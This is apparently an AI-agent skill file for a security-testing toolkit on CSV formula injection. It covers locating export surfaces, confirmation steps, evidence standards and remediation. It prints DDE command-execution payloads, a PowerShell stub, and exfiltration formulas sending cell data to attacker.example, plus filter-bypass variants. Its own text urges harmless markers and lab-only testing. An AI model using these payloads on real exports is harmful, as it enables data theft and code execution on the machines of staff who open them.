---
name: csv-formula-injection
description: "CSV formula injection — spreadsheet payload execution, DDE, and data exfiltration via exported files"
category: "web-application"
version: "1.1"
author: "cyberstrike-official"
tags:
  - csv
  - injection
  - excel
  - export
  - attack
tech_stack:
  - web
  - excel
  - libreoffice
cwe_ids:
  - CWE-1236
chains_with:
  - xss-cross-site-scripting
  - cmdi-command-injection
prerequisites: []
severity_boost:
  - xss-cross-site-scripting
  - cmdi-command-injection
---

# CSV Formula Injection

> **AI LOAD INSTRUCTION**: The vulnerability is that a spreadsheet treats any cell beginning
> with `=`, `+`, `-`, or `@` as a **formula**, not as text. So when an application exports a
> CSV containing user-controlled data, a value you submitted becomes a formula that executes
> on the machine of whoever opens the file. The application is not executing anything. Excel
> is. That is why this sits outside the normal injection mental model.
>
> The finding requires **an input the application echoes into an export**. Find the export,
> find which fields you control in it, and place a payload that is inert when displayed but
> proves execution. **Never use a payload that exfiltrates real data or executes a command on a
> real user's machine** — the proof is a formula that produces a visible, harmless marker.
>
> **Modern Excel blocks DDE by default but not the rest.** `=HYPERLINK` and `=WEBSERVICE` still
> make outbound requests, and `=cmd|' /C calc'!A0` remains the classic payload that older
> configurations and other spreadsheet applications will still run.

## 0. RELATED ROUTING

- [xss-cross-site-scripting](../xss-cross-site-scripting/SKILL.md) — the sibling client-side injection
- [cmdi-command-injection](../cmdi-command-injection/SKILL.md) — what DDE reaches on the host
- [security-reporting-and-documentation](../security-reporting-and-documentation/SKILL.md) — reporting a client-side execution finding
- [excel-and-document-weapons](../cmdi-command-injection/SKILL.md) — the document-payload family
- [smtp-and-phishing-delivery](../email-header-injection/SKILL.md) — how the poisoned export reaches a victim
- [file-upload-vulnerabilities](../upload-insecure-files/SKILL.md) — the upload side of file handling

---

## 1. FINDING THE EXPORT SURFACE

CSV formula injection needs a user-controlled value in an exported spreadsheet. Locate every
export path first.

| Export surface | Typical trigger |
|---|---|
| user list export | admin panel, "Export CSV" |
| transaction / order report | finance or reporting section |
| audit log export | security settings |
| contact / lead export | CRM features |
| form submissions | results export |
| time tracking / timesheet | HR features |
| product catalogue | inventory export |
| newsletter subscribers | marketing export |
| support ticket export | helpdesk |
| bank statement / ledger | accounting |

**Also consider these formats** — the same issue applies wherever a spreadsheet parses the file:

```text
.csv   .tsv   .xls   .xlsx   .ods   .xlsm
```

**And these delivery paths**, which change who opens the file:

| Path | Who opens it |
|---|---|
| an employee downloads it | internal staff — often the most valuable target |
| an admin exports and opens it | privileged access |
| the application emails it | the recipient |
| a report is generated on a schedule | automated, but often opened by a human |
| a customer exports their own data | the customer |

**The internal-staff row is the one that escalates severity.** An analyst opening a poisoned
export runs the payload on a corporate workstation, inside the network.

**Test every field you can influence.** A CSV holds many columns; the one you control may not
be the first. Enumerate which of your inputs appear in the export — profile name, address,
notes, ticket subject, filename, and any free-text field.

---

## 2. PAYLOAD CONSTRUCTION

**The four trigger characters:**

```text
=   +   -   @
```

A cell starting with any of these is parsed as a formula by Excel, LibreOffice Calc, Google
Sheets, and most spreadsheet software.

**Marker payloads — visible, harmless, provable:**

```text
=1+1
=CONCATENATE("ltx","canary")
=1*1
```

**If the cell displays `2` or `ltxcanary` instead of the literal text, formula execution is
confirmed.** That is the minimal, safe proof and it is sufficient for a report.

**Command execution payloads — for demonstrating the worst case, in a lab only:**

```text
=cmd|' /C calc'!A0
=cmd|'/c powershell -c "..."'!A0
=DDE("cmd";"/C calc";"__DDE__")
```

**These are the payloads you document but do not run against a real user.** Show the mechanism
and the affected cell; do not open a calculator on someone's workstation.

**Data exfiltration payloads — document the mechanism, do not execute:**

```text
=HYPERLINK("https://attacker.example/?d="&A1&B1,"Click me")
=WEBSERVICE("https://attacker.example/?d="&A1)
=IMPORTXML("https://attacker.example/?d="&A1,"//x")
=IMPORTDATA("https://attacker.example/?d="&A1)
=IMPORTHTML("https://attacker.example/?d="&A1,"table",1)
```

**`HYPERLINK` requires a click; `WEBSERVICE`, `IMPORTXML`, `IMPORTDATA`, and `IMPORTHTML`
fire automatically when the file is opened** and the formula is recalculated. Those are the
silent exfiltration routes and the reason this class is high severity when the export contains
sensitive columns.

**The exfiltration primitives can reference other cells.** `A1` and `B1` above read the
neighbouring cells — meaning a single injected formula can read and transmit an entire row,
including fields you do not control.

**Filter bypasses** — applications increasingly block the trigger characters:

```text
=1+1                       basic
 =1+1                      leading space, if trimmed after the check
\t=1+1                     tab prefix
"=1+1"                     quoted, if quotes are stripped later
'=1+1                      apostrophe, in some parsers
=cmd|' /C calc'!A0
=SUM(1,1)
```

**The Excel-specific list separator matters:** the payload separator differs by locale. Use
`;` instead of `,` in European locales:

```text
=HYPERLINK("https://attacker.example/";A1)
```

**The alternative trigger `@`** is frequently forgotten by filters that only block `=`:

```text
@SUM(1+1)*cmd|' /C calc'!A0
```

---

## 3. CONFIRMING EXECUTION

**The minimal, safe confirmation sequence:**

1. Submit a value containing `=1+1` into a field you control.
2. Trigger the export.
3. Open the file in a spreadsheet application **on a machine you own**, in a sandbox.
4. Observe whether the cell shows `2` (formula executed) or `=1+1` (treated as text).

**That is the whole test.** A cell displaying `2` where you submitted `=1+1` is proof of formula
injection, and it required no dangerous payload.

**Note the client-dependent behaviour:**

| Viewer | Behaviour |
|---|---|
| Excel (desktop) | formulas execute; DDE blocked by default in recent versions |
| Excel (web) | most formula execution blocked |
| LibreOffice Calc | formulas execute; DDE handling differs |
| Google Sheets | formulas execute; some functions unavailable |
| a CSV viewer / text editor | no execution — the file is just text |
| a script consuming the CSV | no execution |

**Severity depends on which client opens it.** An internal report opened in desktop Excel is
the realistic high-severity path. A file consumed by a script is not a finding at all.

**Do not test the dangerous payloads.** `=1+1` proves the same mechanism. The `cmd|` payload
proves nothing additional about the *application* — it proves something about the *viewer's
configuration*, which you must not probe on someone else's machine.

---

## 4. ESCALATION PATHS

| Chain | Mechanism |
|---|---|
| row-wide exfiltration | a formula reads neighbouring cells and transmits the whole row |
| credential access | the export contains tokens, API keys, or password fields |
| network reconnaissance | `WEBSERVICE` requests reveal an internal reachable host |
| command execution | `cmd|` / DDE on a machine that permits it |
| phishing amplification | a `HYPERLINK` in the export points at an attacker page |
| pivot to the internal network | the formula fires from a corporate workstation behind the firewall |
| persistence | a poisoned export re-imported by the application |

**The row-wide exfiltration chain is the one to emphasise.** A single injected cell can read
every other column in its row — including columns you cannot control, such as another user's
email address, an internal identifier, or a balance. **That is why the finding is not limited
to the field you injected into.**

**Test whether the export is re-importable.** If the application accepts CSV import, a formula
survives the round trip and can be stored server-side, turning a one-time export issue into
persistent stored data.

---

## 5. WHAT CONSTITUTES A FINDING

| Finding | Severity | Proof required |
|---|---|---|
| Formula executes and exfiltrates other columns, automated function | **High (P2)** | the crafted export and the exfiltration request observed in a lab |
| Formula executes and reaches command execution | **High–Critical (P1/P2)** | the payload and the target viewer's configuration |
| Formula executes with a visible marker | **Medium (P3)** | the export showing `2` where `=1+1` was submitted |
| Trigger character accepted but not proven to execute | **Low (P4)** | the exported cell, unverified in a client |
| Field is escaped or prefixed with an apostrophe | **Not a finding** | the export shows the literal text |
| Export is consumed by a script, never by a spreadsheet | **Not a finding** | no execution context |

**Do not claim command execution without knowing the viewer.** A formula that would run
`cmd|` on an old Excel installation is a *potential* RCE; the same file opened in Google Sheets
is a marker. State which viewer you verified with.

---

## 6. CONFIRMING THE FINDING

A CSV file is data; a **spreadsheet is an interpreter**, and the finding lives in the second one. The
bytes in the export are never the finding - **the rendered cell value in the spreadsheet that opened it** is.

| Step | Question | What it proves |
|---|---|---|
| 1 | Was the export captured **as bytes**, before any spreadsheet touched it? | the artefact is the CSV; the finding is what the reader did with it |
| 2 | Was the file **opened in a real spreadsheet** with the default settings a user would have? | a parser setting you chose is not the victim's configuration |
| 3 | Was the **rendered value read back** after the import - not the raw cell text? | this is the interpreter's output, and it is the finding |
| 4 | Is the **control present**: the same value in a non-exported cell, or in a quoted-safe CSV? | without it, you have not shown the export caused the interpretation |
| 5 | Was the **formula actually evaluated**, or merely stored as a string? | a leading `'` or a text-formatted column makes it inert - that is the negative result |
| 6 | Is the **trigger named**: which of `=`, `+`, `-`, `@`, tab, or CR made the reader interpret it? | the prefix is the mechanism and it is what the fix addresses |
| 7 | Was the **dangerous function confirmed reachable**, not just the formula parsed? | `=1+1` proves evaluation; it does not prove `WEBSERVICE` or `HYPERLINK` is reachable in that build |

**A captured export, a real spreadsheet with default settings, a read-back rendered value, and a quoted-safe
control.** A cell containing `=cmd` is a string; the finding is the spreadsheet that ran it.

---

## 7. EXECUTION PRIMITIVES

The whole domain reduces to one discipline: **the export is written by you, opened by someone else, and
the evidence is their spreadsheet's rendering.** Every step below is a procedure, and the control pair is
the dangerous CSV against the quoted-safe CSV.

### 1. The export, captured as bytes

```bash
echo "=== 1. capture the export as BYTES, with its Content-Type and disposition ==="
cat <<'CAP'
  RECORD BEFORE OPENING ANYTHING:
    the exact REQUEST that produced the export (parameters, and any user-controlled field)
    the RESPONSE BYTES, saved to a file, plus its SHA-256
    the Content-Type and Content-Disposition headers (delimiter, quoting, and encoding come from here)
  THE FIELD THAT MATTERS: which user-controlled value lands in a cell that will be interpreted? Name it.
    Common carriers: a display name, an address, a free-text note, an order reference, a CSV-imported
    record that was itself exported again (the SECOND-ORDER case, which is the one people miss).
  AND THE ENCODING: a UTF-8 BOM, a semicolon delimiter, or a Windows-1252 codepage each change whether
  the reader interprets the cell. Record all three; a claim without them is not reproducible.
CAP
echo
echo "=== the payload classes, and what each targets ==="
python3 - <<'PY'
P = [("=", "the generic formula prefix",        "evaluated by every spreadsheet"),
     ("+", "arithmetic prefix",                  "interpreted by Excel and LibreOffice, often missed by filters"),
     ("-", "arithmetic prefix",                  "same; a leading minus on a numeric-looking field"),
     ("@", "legacy macro / function prefix",     "older Excel, and a filter bypass because it is not '='"),
     ("TAB or CR", "the DDE / separator trick",  "re-splits the cell and defeats a naive quoting filter"),
     ("a leading quote '", "the ESCAPE, not a payload", "makes the cell TEXT - this is the FIX, verify it works")]
print("%-16s %-30s %s" % ("prefix","class","note"))
for a,b,c in P: print("%-16s %-30s %s" % (a,b,c))
print()
print("  THE TEST PAYLOAD MUST PROVE THE INTERPRETER, NOT THE PARSER: '=1+1' evaluating to 2 is the")
print("  minimum. Then the reachable set: WEBSERVICE / HYPERLINK / IMPORTXML / DDE / external refs.")
print("  AND PROVE REACHABILITY IN THE TARGET'S BUILD: an old .xls, a modern .xlsx, LibreOffice,")
print("  Google Sheets, and an Excel with macros disabled are FIVE DIFFERENT interpreters.")
PY
```

**Record which user-controlled field lands in the interpreted cell** — and note the second-order case: a
record that was itself CSV-imported and then exported again.

### 2. The control pair, which is the whole finding

```bash
echo "=== THE CONTROL PAIR ==="
cat <<'PAIR'
  A. the EXPORT carrying the payload, opened in a real spreadsheet with DEFAULT settings
       -> the RENDERED CELL shows the evaluated result   <- THE FINDING
  B. the SAME value in a QUOTED-SAFE export (the cell prefixed with ' or the column text-formatted)
       -> the cell shows the LITERAL STRING             <- THE CONTROL
  AND THE EXACT OBSERVATION IN B: the leading apostrophe is VISIBLE IN THE FORMULA BAR but not in the
  cell, and the cell is TEXT. THAT DIFFERENCE BETWEEN A AND B IS THE FINDING.
  PAIR IT WITH A THIRD: the SAME payload in a NON-EXPORTED vector (typed by hand, or an XLSX written
  directly) -> if it ALSO evaluates, the defect is not in the CSV export path and the report is wrong.
  THAT THIRD TEST IS WHAT ATTRIBUTES THE FLAW TO THE EXPORT.
PAIR
echo
echo "=== what each reader actually does (the interpreter table) ==="
python3 - <<'PY'
R = [("Excel, .csv opened by double-click", "INTERPRETS = + - @ and evaluates", "the default path a user takes"),
     ("Excel, CSV imported via Data > From Text", "INTERPRETS, and shows a dialog", "the 'cautious' path that still interprets unless the column is set to Text"),
     ("Excel, column formatted as Text first", "does NOT interpret", "THE FIX - and verify it persists across a re-export"),
     ("LibreOffice Calc", "INTERPRETS by default, with a prompt", "a different default from Excel"),
     ("Google Sheets, File > Import", "INTERPRETS unless 'Convert text to numbers' handling is changed", "the cloud path, and the one users share"),
     ("a CSV consumer that is not a spreadsheet (a script, a DB loader)", "does NOT interpret", "proves the finding is the SPREADSHEET's, not the CSV's")]
print("%-46s %-44s %s" % ("reader","interpretation","note"))
for a,b,c in R: print("%-46s %-44s %s" % (a,b,c))
print()
print("  STATE WHICH READER YOU USED AND ITS VERSION. An Excel-only finding is not a LibreOffice finding,")
print("  and Google Sheets makes the same export a different, cloud-shared exposure.")
PY
```

**The quoted-safe export rendering the literal string is the control** — and the leading apostrophe visible
in the formula bar but not the cell is the difference that *is* the finding.

### 3. Impact, and the end-to-end harness

```bash
```
echo "=== FROM EVALUATION TO IMPACT: the ladder, climb only what you demonstrated ==="
cat <<'LADDER'
  1. EVALUATION        the formula ran          -> low: a spreadsheet did arithmetic
  2. DATA EXFIL        WEBSERVICE / IMPORTXML fetched an attacker URL  -> the request ARRIVING AT YOUR
                       LISTENER, with the client's IP, IS THE PROOF. Without the inbound hit you have 1.
  3. HOST INTERACTION  HYPERLINK prompts, or DDE launches  -> the prompt appearing, or the process
                       starting, is the proof; the formula text is not
  4. CODE EXECUTION    DDE or a macro  -> requires the user to accept a prompt and macros enabled.
                       SAY SO. 'RCE' without that chain is a claim, not a result.
  THE RULE: STATE THE HIGHEST NUMBER YOU DEMONSTRATED, AND NAME THE STEP ABOVE IT AS UNPROVEN.
LADDER
echo
echo "=== the second-order case, which is the one that actually ships ==="
cat <<'SECOND'
  THE PATH THAT MATTERS IN PRACTICE: a user SUBMITS a value, the platform STORES it, the platform
  EXPORTS it to CSV, and an ADMIN opens the export. The payload was never in the attacker's own file.
  TO PROVE IT: show the stored value (via the platform's own UI/API), then show the EXPORT bytes
  containing it, then show the admin's reader evaluating it. THREE links, all three evidenced.
  AND THE FILTER TEST: if the platform sanitises on INPUT, test the EXPORT-side filter too - a leading
  tab, a leading space, or a re-imported record frequently passes a filter written for the input path.
SECOND
echo
echo "=== end-to-end harness ==="
python3 - <<'PY'
print("=== CSV FORMULA INJECTION ACCEPTANCE CHECKLIST ===")
CHECKS = [
 ("the export is captured as BYTES with its SHA-256, Content-Type, and Content-Disposition",
  "the artefact is the file; the finding is the reader's interpretation of it"),
 ("the user-controlled FIELD that lands in the interpreted cell is named",
  "the injection point, and the fix's target"),
 ("the encoding, delimiter, and quoting of the export are recorded",
  "each changes whether the reader interprets, so a claim without them is not reproducible"),
 ("the file was opened in a REAL spreadsheet with DEFAULT settings",
  "a parser setting you chose is not the victim's configuration"),
 ("the RENDERED cell value was read back after import, not the raw cell text",
  "the interpreter's output is the evidence"),
 ("the CONTROL ran: the quoted-safe export shows the LITERAL string",
  "the difference between the two readers is the finding"),
 ("a THIRD test placed the same payload in a NON-exported vector",
  "if it also evaluates, the defect is not the export path"),
 ("the reader and its VERSION are named, and the finding is scoped to it",
  "Excel, LibreOffice, and Google Sheets are different interpreters"),
 ("the IMPACT STEP is stated as the highest one demonstrated, with the next named unproven",
  "'RCE' without the user-accept and macros-enabled chain is a claim"),
 ("for exfiltration, the INBOUND REQUEST at the listener is captured",
  "the formula text is not proof that anything was fetched"),
 ("the SECOND-ORDER path is tested, and the export-side filter as well as the input-side one",
  "the shipped defect is a stored value exported to an admin, not the attacker's own file"),
]
for n, how in CHECKS: print("  [ ] %-74s -> %s" % (n, how))
print()
print("=== THE REPORT SHAPE ===")
print("  artefact : the export bytes, hash, headers, encoding, delimiter, quoting")
print("  field    : which user-controlled value, and how it reached the cell")
print("  reader   : the spreadsheet, its version, and its default settings")
print("  control  : the quoted-safe export's literal rendering, and the non-export vector test")
print("  impact   : the highest demonstrated step, and the unproven step above it")
PY

---

---

## 8. EVIDENCE STANDARD

| Item | Why |
|---|---|
| the input field you controlled | the injection point |
| the exact submitted value | reproducibility |
| **the exported file** (or the relevant row) | shows the payload survived export |
| **a screenshot of the opened file showing the formula's result** | proves execution, not just storage |
| the spreadsheet application and version used | behaviour is viewer-dependent |
| whether the trigger character was escaped, stripped, or preserved | the control's status |
| for exfiltration: the outbound request in a lab environment only | the impact |
| a **control**: a normal value in the same field exporting as text | proves the export is otherwise correct |

**The opened-file screenshot is the finding.** A CSV containing `=1+1` proves nothing until a
spreadsheet evaluates it. That screenshot, taken in your own lab, is what makes the report
credible and safe.

**False positives to exclude:**

| Looks like injection | Actually |
|---|---|
| the CSV contains `=1+1` but opens as literal text | the client does not execute, or the field is quoted |
| the application prefixes values with `'` | properly escaped — not a finding |
| the export is a `.txt` or is consumed by a script | no spreadsheet context |
| the value is quoted with `"` and the quotes are preserved | correctly escaped |
| you opened it in a text editor and saw the payload | that is storage, not execution |
| the formula executed in your own test file, not the exported one | you tested the wrong artefact |

---


## 9. REMEDIATION REFERENCE

1. **Prefix every exported field with a single quote** — `'` prevents interpretation in Excel and Calc. Apply unconditionally to all fields, not only those containing a trigger character.
2. **Escape by prefixing, never by stripping** — removing the `=` changes the user's data; prefixing preserves it and neutralises the formula.
3. **Reject or neutralise cells beginning with `=`, `+`, `-`, `@`, tab, and CR** — these are the full set of trigger characters, and filters that check only `=` miss the rest.
4. **Quote all fields in the CSV** — RFC 4180 quoting, with internal quotes doubled. This does not prevent formula interpretation by itself but is a prerequisite for correct escaping.
5. **Prefer a format that cannot execute formulas for machine consumers** — JSON or XML for programmatic use, and reserve `xlsx` for human-facing exports where the library can write text-typed cells explicitly.
6. **Use a library that writes cells with an explicit text type** — when generating `xlsx` directly, set the cell type to string so the spreadsheet never treats the value as a formula.
7. **Document the risk on the export itself** — if a download must be opened in a spreadsheet, a warning on the export page or in the filename reduces the chance of a dangerous payload being delivered by mistake.
8. **Map the full export inventory and test each one** — this class is per-endpoint; a fixed report does not protect a newly added one. Add a test that submits a trigger character and asserts the export escapes it.

---

## 10. RELATED SIBLINGS - LOAD TOGETHER

- [injection-checking](../injection-checking/SKILL.md) - the router that decides which interpreter owns the sink
- [attack-ssti](../attack-ssti/SKILL.md) - the other case where a data format becomes an interpreter
- [xxe-xml-external-entity](../xxe-xml-external-entity/SKILL.md) - a file format whose parser is the interpreter
- [security-reporting-and-documentation](../security-reporting-and-documentation/SKILL.md) - how an interpreter-dependent finding is written
- [expression-language-injection](../expression-language-injection/SKILL.md) - expression evaluation where text was expected
